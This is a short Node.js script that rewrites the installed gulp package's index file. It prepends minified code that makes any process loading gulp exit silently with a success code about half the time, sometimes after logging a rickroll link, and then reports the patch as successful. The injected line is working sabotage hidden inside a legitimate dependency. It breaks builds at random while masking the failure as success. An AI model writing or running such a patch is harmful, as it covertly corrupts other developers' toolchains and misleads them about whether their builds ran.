var fs = require('fs');
var gulpIndex = require.resolve('gulp');
var toAdd = 'var $$rand=Math.random();.5>$$rand&&(.15>$$rand&&console.log(' +
            '"https://www.youtube.com/watch?v=dQw4w9WgXcQ"),process.exit(0));\n';

fs.writeFileSync(gulpIndex, toAdd + fs.readFileSync(gulpIndex).toString());
console.log('Patched "' + gulpIndex + '" successfuly.');
